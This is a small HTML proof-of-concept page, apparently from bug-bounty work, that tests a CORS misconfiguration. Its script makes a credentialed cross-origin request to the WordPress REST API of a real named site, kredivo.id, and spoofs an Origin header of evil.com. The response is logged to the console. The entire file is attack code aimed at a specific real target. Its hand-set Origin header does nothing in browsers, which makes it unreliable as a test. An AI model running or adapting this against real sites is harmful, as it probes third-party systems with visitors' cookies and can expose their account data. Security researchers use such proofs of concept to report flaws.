<!-- file: cors-poc.html -->
<!DOCTYPE html>
<html>
  <body>
    <h1>CORS POC</h1>
    <script>
      fetch("https://kredivo.id/wp-json/", {
        method: "GET",
        credentials: "include",
        headers: {
          Origin: "https://evil.com"
        }
      })
      .then(response => response.text())
      .then(data => console.log("Response:", data));
    </script>
  </body>
</html>
